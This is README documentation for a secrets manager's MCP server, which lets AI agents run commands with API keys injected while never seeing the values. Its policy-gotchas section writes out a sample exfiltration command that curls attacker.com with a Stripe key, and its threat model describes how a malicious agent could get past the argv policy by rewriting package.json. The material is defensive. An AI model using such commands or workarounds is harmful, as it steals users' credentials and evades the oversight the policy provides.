# klef MCP server

`klef mcp` exposes klef to MCP clients (Claude Desktop, Claude Code, Cursor) so an agent can use your API keys without ever receiving the plaintext value.

## What's exposed — and what isn't

| Tool | Effect | Sees secret values? |
|---|---|---|
| `klef_list` | Returns names + metadata | ❌ never |
| `klef_run`  | Spawns a process with `klef:` refs injected as env vars; returns stdout/stderr | ❌ not directly |
| ~~`klef_get`~~ | _not exposed_ — would leak values into the agent's context | — |
| ~~`klef_add` / `klef_rm` / `klef_edit`~~ | _not exposed_ — mutation stays manual | — |

To populate a `.env`, the agent writes the *reference* `klef:<name>` directly. It never needs the value.

## Setup — Claude Desktop

```json
{
  "mcpServers": {
    "klef": {
      "command": "klef",
      "args": ["mcp"]
    }
  }
}
```

Restart Claude Desktop. Ask "list my klef keys" — you should see metadata. Ask "show me my Stripe key" — Claude will say it can't (the tool doesn't exist).

## Policy file

Path resolves via [`dirs::config_dir()`](https://docs.rs/dirs/latest/dirs/fn.config_dir.html), which is OS-dependent:

| OS | Path |
|---|---|
| Linux | `~/.config/klef/mcp-policy.toml` |
| macOS | `~/Library/Application Support/klef/mcp-policy.toml` |
| Windows | `%APPDATA%\klef\mcp-policy.toml` |

First run writes a commented skeleton; edit it to enable `klef_run`. Override with `klef mcp --policy <PATH>`.

```toml
workspace_roots = ["/Users/oscarr/Desktop", "/Users/oscarr/code"]

[[allow]]
argv = ["npm", "run", "*"]
env_refs = ["stripe", "anthropic"]

[[allow]]
argv = ["cargo", "test"]
env_refs = []
```

Matching rules:
- A request is allowed if some rule's `argv` matches (token-level globs, `*` and `?`) **and** the rule's `env_refs` covers every requested env_ref.
- Shells are denied unconditionally: `sh, bash, zsh, python, node, ...` — even if a rule appears to allow them.
- If `workspace_roots` is set, requests with a `cwd` outside any root are denied. Empty/unset = no constraint.

## Audit log

Every call (allow or deny) writes one NDJSON entry to `<config-dir>/klef/audit.log` (same OS-dependent base as the policy file above — e.g., `~/Library/Application Support/klef/audit.log` on macOS, `~/.config/klef/audit.log` on Linux). Allow paths emit two records: `phase: "started"` (pre-spawn, the fail-closed gate) and `phase: "completed"` (post-spawn, observability). If the started record can't be written, the call is denied and the child is not spawned. No internal rotation — manage with `logrotate` if you keep it forever.

## Policy gotchas

A rule like `argv = ["npm", "run", "*"]` delegates to whatever `package.json` defines. If the same agent that calls klef can also edit `package.json`, it can rewrite an allowed script into a secret-exfil command (e.g., `"start": "curl https://attacker.com?k=$STRIPE_KEY"`). The policy's argv match was satisfied, but the actual program is whatever was just written to disk.

To avoid this:
- Prefer rules that point at fixed wrapper scripts you own (e.g., `argv = ["/Users/me/bin/run-tests.sh"]`).
- Avoid `argv = ["npm", "run", "*"]` style — pin specific scripts: `argv = ["npm", "run", "test"]`, `argv = ["npm", "run", "build"]`.
- The shell denylist catches `bash`, `python`, `node`, etc. — but legitimate executors like `npm`, `cargo`, `make` are by design not on the list. Their power comes from the files they read.

## Threat model

This is **not** a zero-knowledge system. A malicious agent can craft an `argv` that exfiltrates a value (e.g., `curl` with the key in a query string). What this design changes vs. exposing a `klef_get` tool:

- Without `klef_run`: every normal use puts plaintext secrets into the agent's context — passive, continuous leak into transcripts and provider logs.
- With `klef_run`: secrets only enter agent-visible output if the agent issues an explicitly extractive `argv` — leaves an audit trail, rejectable via policy.

Risk shifts from "passive systematic leak" to "active detectable exfil".
